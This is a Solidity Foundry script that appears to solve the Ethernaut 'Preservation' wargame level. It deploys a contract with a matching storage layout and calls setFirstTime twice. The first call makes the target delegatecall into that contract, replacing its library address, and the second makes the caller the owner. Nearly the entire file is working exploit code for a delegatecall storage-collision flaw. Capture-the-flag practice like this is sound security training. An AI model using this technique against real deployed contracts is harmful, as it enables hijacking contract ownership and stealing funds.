// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";

contract ChangeOwner {
    address public t1;
    address public t2;
    address public owner;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

contract PreservationScript is Script {
    Preservation public preservation =
        Preservation(0xda0DE4010A53Aef225f6408CFcB6B23632B8225C);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner of the contract: ", preservation.owner());
        console.log("Timezone 1 library: ", preservation.timeZone1Library());
        console.log("Timezone 2 library: ", preservation.timeZone2Library());

        // Create that new contract and have its address be set to one of the timeZoneLibrary
        ChangeOwner changeOwner = new ChangeOwner();

        // At first we need to call the function setTime because this will change the address of the function call to another address
        preservation.setFirstTime(uint256(uint160(address(changeOwner))));

        // Next when changed, we need to call it using delegate call however we need to have 3 varibles in the stack and the third will represent the address ==> msg.sender
        preservation.setFirstTime(uint256(uint160(address(0xA86Ea1be0A43Ea977dd7489c7c91247B1a7bC50b))));

        console.log("After delegate Owner of the contract: ", preservation.owner());
        console.log("After delegate Timezone 1 library: ", preservation.timeZone1Library());
        console.log("After delegate Timezone 2 library: ", preservation.timeZone2Library());
        vm.stopBroadcast();
    }
}
